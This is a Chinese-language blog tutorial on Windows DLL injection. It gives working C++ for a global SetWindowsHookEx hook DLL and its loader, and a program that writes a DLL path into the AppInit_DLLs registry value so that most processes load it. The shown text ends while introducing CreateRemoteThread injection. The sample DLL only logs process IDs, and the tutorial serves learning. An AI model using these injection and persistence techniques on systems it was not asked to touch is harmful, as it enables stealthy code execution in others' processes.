      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>在其它进程中运行任意代码的手法：代码注入（Code Injection)。网上有一篇好多年前关于DLL注入的文章，”Three Ways to Inject Your Code into Another Process”。</p>
<p>有链接：<a href="https://www.codeproject.com/Articles/4610/Three-Ways-to-Inject-Your-Code-into-Another-Process" target="_blank" rel="noopener">https://www.codeproject.com/Articles/4610/Three-Ways-to-Inject-Your-Code-into-Another-Process</a></p>
<h2 id="1-SetWindowsHookEx劫持系统消息"><a href="#1-SetWindowsHookEx劫持系统消息" class="headerlink" title="1. SetWindowsHookEx劫持系统消息"></a>1. SetWindowsHookEx劫持系统消息</h2><p>如下三个 API 函数，可以劫持系统消息。可以用于单个线程也可以用于进程。</p>
<ul>
<li>SetWindowsHookEx </li>
<li>CallNextHookEx </li>
<li>UnhookWindowsHookEx</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SetWindowsHookEx</span></span><br><span class="line"><span class="function">HHOOK <span class="title">SetWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> idHook,        <span class="comment">// 钩子类型</span></span></span></span><br><span class="line"><span class="function"><span class="params">    HOOKPROC lpfn,     <span class="comment">// 钩子过程</span></span></span></span><br><span class="line"><span class="function"><span class="params">    HINSTANCE hMod,    <span class="comment">// 应用程序实例的句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwThreadId   <span class="comment">// 线程ID</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"><span class="comment">//CallNextHookEx</span></span><br><span class="line"><span class="function">LRESULT <span class="title">CallNextHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HHOOK hhk,         <span class="comment">// 当前钩子的句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> nCode,         <span class="comment">// 传递给钩子过程的代码</span></span></span></span><br><span class="line"><span class="function"><span class="params">    WPARAM wParam,     <span class="comment">// 传递给钩子过程的值</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPARAM lParam      <span class="comment">// 传递给钩子过程的值</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"><span class="comment">//UnhookWindowsHookEx</span></span><br><span class="line"><span class="function">BOOL <span class="title">UnhookWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HHOOK hhk          <span class="comment">// 要解除的对象的钩子过程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//loging.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> LOGING_EXPORTS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGING_API extern <span class="meta-string">"C"</span> __declspec(dllexport)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGING_API extern <span class="meta-string">"C"</span> __declspec(dllimport)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">LOGING_API <span class="keyword">int</span> <span class="title">CallSetWindowsHookEx</span><span class="params">(VOID)</span></span>;</span><br><span class="line"><span class="function">LOGING_API <span class="keyword">int</span> <span class="title">CallUnhookWindowsHookEx</span><span class="params">(VOID)</span></span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//loging.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"loging.h"</span></span></span><br><span class="line"></span><br><span class="line">HHOOK g_hhook = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//将GetMsgProc设为钩子，在系统消息在传递给目标线程原有的窗口之前，会先由GetMsgProc来进行处理。</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> LRESULT WINAPI <span class="title">GetMsgProc</span><span class="params">(<span class="keyword">int</span> code, WPARAM wParam, LPARAM</span></span></span><br><span class="line"><span class="function"><span class="params">lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span>(CallNextHookEx(<span class="literal">NULL</span>, code, wParam, lParam));</span><br><span class="line">    <span class="comment">//调用CallNextHookEx函数，消息会继续传递给下一个钩子过程。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LOGING_API <span class="keyword">int</span> <span class="title">CallSetWindowsHookEx</span><span class="params">(VOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(g_hhook != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    MEMORY_BASIC_INFORMATION mbi;</span><br><span class="line">    <span class="keyword">if</span>(VirtualQuery(CallSetWindowsHookEx, &amp;mbi, <span class="keyword">sizeof</span>(mbi)) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    HMODULE hModule = (HMODULE) mbi.AllocationBase;</span><br><span class="line"></span><br><span class="line">    g_hhook = SetWindowsHookEx(</span><br><span class="line">        WH_GETMESSAGE, GetMsgProc, hModule, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(g_hhook == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="comment">//SetWindowsHookEx的功能是将原本传递给窗口过程的消息劫持下来，交给第2参数中所指定的函数来进行处理。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LOGING_API <span class="keyword">int</span> <span class="title">CallUnhookWindowsHookEx</span><span class="params">(VOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(g_hhook == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    UnhookWindowsHookEx(g_hhook);</span><br><span class="line">    g_hhook = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上API是用来劫持消息的，但如果要劫持其他进程的窗口过程消息，就需要”在其他进程中“加载DLL。将loging.cpp编译成DLL，然后调用SetWindowsHookEx,就可以对持有窗口过程的进程和线程应用钩子，让这些进程加载DLL。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//dllmain.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">WriteLog</span><span class="params">(TCHAR *szData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR szTempPath[<span class="number">1024</span>];</span><br><span class="line">    GetTempPath(<span class="keyword">sizeof</span>(szTempPath), szTempPath);</span><br><span class="line">    lstrcat(szTempPath, <span class="string">"loging.log"</span>);</span><br><span class="line"></span><br><span class="line">    TCHAR szModuleName[<span class="number">1024</span>];</span><br><span class="line">    GetModuleFileName(GetModuleHandle(<span class="literal">NULL</span>),</span><br><span class="line">        szModuleName, <span class="keyword">sizeof</span>(szModuleName));</span><br><span class="line"></span><br><span class="line">    TCHAR szHead[<span class="number">1024</span>];</span><br><span class="line">    wsprintf(szHead, <span class="string">"[PID:%d][Module:%s] "</span>,</span><br><span class="line">        GetCurrentProcessId(), szModuleName);</span><br><span class="line"></span><br><span class="line">    HANDLE hFile = CreateFile(</span><br><span class="line">        szTempPath, GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>,</span><br><span class="line">        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    SetFilePointer(hFile, <span class="number">0</span>, <span class="literal">NULL</span>, FILE_END);</span><br><span class="line"></span><br><span class="line">    DWORD dwWriteSize;</span><br><span class="line">    WriteFile(hFile, szHead, lstrlen(szHead), &amp;dwWriteSize, <span class="literal">NULL</span>);</span><br><span class="line">    WriteFile(hFile, szData, lstrlen(szData), &amp;dwWriteSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    CloseHandle(hFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        WriteLog(<span class="string">"DLL_PROCESS_ATTACH\n"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        WriteLog(<span class="string">"DLL_PROCESS_DETACH\n"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使的在DLL成功加载之后，向%TEMP%目录输出一个名为loging.log的日志文件。日志的内容包括进程ID和模块路径。</p>
<p>将dllmain.cpp和loging.cpp，loging.h进行编译，然后编写一个加载这个DLL并调用CallSetWindowsHookEx。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// setwindowshook.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s &lt;DLL Name&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	HMODULE h = LoadLibrary(argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">if</span>(h == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> (__stdcall *fcall) (VOID);</span><br><span class="line">	fcall = (<span class="keyword">int</span> (WINAPI *)(VOID))</span><br><span class="line">		GetProcAddress(h, <span class="string">"CallSetWindowsHookEx"</span>);</span><br><span class="line">	<span class="keyword">if</span>(fcall == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"ERROR: GetProcAddress\n"</span>);</span><br><span class="line">		<span class="keyword">goto</span> _Exit;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> (__stdcall *ffree) (VOID);</span><br><span class="line">	ffree = (<span class="keyword">int</span> (WINAPI *)(VOID))</span><br><span class="line">		GetProcAddress(h, <span class="string">"CallUnhookWindowsHookEx"</span>);</span><br><span class="line">	<span class="keyword">if</span>(ffree == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"ERROR: GetProcAddress\n"</span>);</span><br><span class="line">		<span class="keyword">goto</span> _Exit;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(fcall())&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"ERROR: CallSetWindowsHookEx\n"</span>);</span><br><span class="line">		<span class="keyword">goto</span> _Exit;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Call SetWindowsHookEx\n"</span>);</span><br><span class="line"></span><br><span class="line">	getchar();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(ffree())&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"ERROR: CallUnhookWindowsHookEx\n"</span>);</span><br><span class="line">		<span class="keyword">goto</span> _Exit;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Call UnhookWindowsHookEx\n"</span>);</span><br><span class="line"></span><br><span class="line">_Exit:</span><br><span class="line">	FreeLibrary(h);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;setwindowshook.exe loging.dll</span><br><span class="line">Call SetWindowsHookEx</span><br></pre></td></tr></table></figure>
<p>打开 <code>C:\Documents and Settings\Campers\Local Settings\Temp\loging.log</code> 文件，我们可以查看加载 DLL 的日志（Windows Vista 及以上版本的系统中，这个文件位于<code>C:\Users\ 用户名 \AppData\Local\Temp\loging.log</code>）。我们可以看到，其他进程已经加载了 loging.dll</p>
<h2 id="2-将DLL路径配置到注册表的AppInit-DLLs项"><a href="#2-将DLL路径配置到注册表的AppInit-DLLs项" class="headerlink" title="2.将DLL路径配置到注册表的AppInit_DLLs项"></a>2.将DLL路径配置到注册表的AppInit_DLLs项</h2><p>SetWindowsHookEx 可以在调用时将 DLL 映射到其他进程中，不过如果我们将 DLL 的路径配置在注册表的 AppInit_DLLs 项中，就可以在系统启动时将任意 DLL 加载到其他进程中。</p>
<p>运行 regedit，找到下面的路径。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; //运行 regedit，找到下面的路径。</span><br><span class="line">&gt; </span><br><span class="line">&gt; HKEY_LOCAL_MACHINE\</span><br><span class="line">&gt;   SOFTWARE\</span><br><span class="line">&gt;     Microsoft\</span><br><span class="line">&gt;       Windows NT\</span><br><span class="line">&gt;         CurrentVersion\</span><br><span class="line">&gt;           Windows\</span><br><span class="line">&gt;             AppInit_DLLs         在这里填写DLL路径，以逗号分隔</span><br><span class="line">&gt;             LoadAppInit_DLLs     AppInit_DLLs启用/禁用标志</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>Windows XP 中没有 LoadAppInit_DLLs 这一项。此外，在 Windows 7 中，多了一个叫作 RequireSignedAppInit_DLLs 的项，这一项代表只允许加载经过签名的 DLL（</p>
<table>
<thead>
<tr>
<th>Only load code-signed DLLs.\${REMOVE}\$</th>
<th>0x0 – Load any DLLs.</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td>0x1 – Load only code-signed DLLs.</td>
</tr>
</tbody>
</table>
<p>）。<a href="https://docs.microsoft.com/zh-cn/windows/desktop/Win7AppQual/appinit-dlls-in-windows-7-and-windows-server-2008-r2" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/desktop/Win7AppQual/appinit-dlls-in-windows-7-and-windows-server-2008-r2</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//在 64 位系统 中，关于 32 位程序的相关设定已被重定向到 Wow6432Node 中。</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\</span><br><span class="line">  SOFTWARE\</span><br><span class="line">    Wow6432Node\</span><br><span class="line">      Microsoft\</span><br><span class="line">        Windows NT\</span><br><span class="line">          C</span><br><span class="line">urrentVersion\</span><br><span class="line">            Windows\</span><br><span class="line">              AppInit_DLLs      在这里填写DLL路径，以逗号分隔</span><br><span class="line">              LoadAppInit_DLLs  AppInit_DLLs启用/禁用标志</span><br></pre></td></tr></table></figure>
<p>AppInit_DLLs 中所配置的 DLL 是通过 user32.dll 来加载的，因此，对于原本就不依赖（不加载）user32.dll 的进程来说，这一配置是无效的。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//writeappinit.cpp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s &lt;DLL Name&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    HKEY hKey;</span><br><span class="line">    LSTATUS lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE,</span><br><span class="line">        <span class="string">"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows"</span>,</span><br><span class="line">        <span class="literal">NULL</span>, KEY_ALL_ACCESS, &amp;hKey);</span><br><span class="line">    <span class="keyword">if</span>(lResult != ERROR_SUCCESS)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Error: RegOpenKeyEx failed.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DWORD dwSize, dwType;</span><br><span class="line">    TCHAR szDllName[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    RegQueryValueEx(hKey,</span><br><span class="line">        <span class="string">"AppInit_DLLs"</span>, <span class="literal">NULL</span>, &amp;dwType, <span class="literal">NULL</span>, &amp;dwSize);</span><br><span class="line">    RegQueryValueEx(hKey,</span><br><span class="line">        <span class="string">"AppInit_DLLs"</span>, <span class="literal">NULL</span>, &amp;dwType, (LPBYTE)szDllName, &amp;dwSize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"AppInit_DLLs: %s -&gt; "</span>, szDllName);</span><br><span class="line">    lstrcpy(szDllName, argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    lResult = RegSetValueEx(hKey, <span class="string">"AppInit_DLLs"</span>,</span><br><span class="line">        <span class="number">0</span>, REG_SZ, (PBYTE)szDllName, lstrlen(szDllName) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(lResult != ERROR_SUCCESS)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Error: RegSetValueEx failed.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RegQueryValueEx(hKey,</span><br><span class="line">        <span class="string">"AppInit_DLLs"</span>, <span class="literal">NULL</span>, &amp;dwType, <span class="literal">NULL</span>, &amp;dwSize);</span><br><span class="line">    RegQueryValueEx(hKey,</span><br><span class="line">        <span class="string">"AppInit_DLLs"</span>, <span class="literal">NULL</span>, &amp;dwType, (LPBYTE)szDllName, &amp;dwSize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, szDllName);</span><br><span class="line"></span><br><span class="line">    RegCloseKey(hKey);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;writeappinit.exe &quot;C:\\loging.dll&quot;</span><br><span class="line">AppInit_DLLs: -&gt; C:\\loging.dll</span><br></pre></td></tr></table></figure>
<p>writeappinit.cpp 可以向注册表的 AppInit_DLLs 项写入任意值，因此我们可以指定 loging.dll 的路径并运行这个程序。</p>
<p>从此以后，凡是加载了 user32.dll 的进程，同时也会加载 loging.dll。可以尝试用OD打开某一个exe文件，查看模块列表，其中就会有loging.dll。</p>
<p>以上的源代码及二进制文件：链接: <a href="https://pan.baidu.com/s/1ATRUJno87ByRIZhbKhNT7A" target="_blank" rel="noopener">https://pan.baidu.com/s/1ATRUJno87ByRIZhbKhNT7A</a> 密码: cfjq</p>
<h2 id="3-通过CreateRemoteThread在其他进程中创建线程"><a href="#3-通过CreateRemoteThread在其他进程中创建线程" class="headerlink" title="3.通过CreateRemoteThread在其他进程中创建线程"></a>3.通过CreateRemoteThread在其他进程中创建线程</h2><p>我们可以用 CreateRemoteThread 这个 API 函数在其他进程中创建线程，这个函数可以在新线程中运行 LoadLibrary，从而使得其他进程强制加载某个 DLL。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HANDLE hProcess,       <span class="comment">// 进程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwStackSize,     <span class="comment">// 栈初始长度（字节数）</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpParameter,    <span class="comment">// 新线程的参数指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwCreationFlags, <span class="comment">// 创建标志</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPDWORD lpThreadId     <span class="comment">// 分配的线程ID指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>但是LoadLibrary的参数必须位于目标进程内部，因此，LoadLibrary所需要的参数字符串必须事先写入目标进程的内存空间中。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//injectcode.h</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InjectDLLtoProcessFromName</span><span class="params">(TCHAR *szTarget, TCHAR *szDllPath)</span></span>;</span><br><span class="line"><span class="comment">//按照可执行文件名找到相应的进程并注入DLL</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InjectDLLtoProcessFromPid</span><span class="params">(DWORD dwPid, TCHAR *szDllPath)</span></span>;</span><br><span class="line"><span class="comment">//按照进程ID找到相应的进程并注入DLL</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InjectDLLtoNewProcess</span><span class="params">(TCHAR *szCommandLine, TCHAR *szDllPath)</span></span>;</span><br><span class="line"><span class="comment">//创建新进程并注入DLL</span></span><br></pre></td></tr></table></figure>
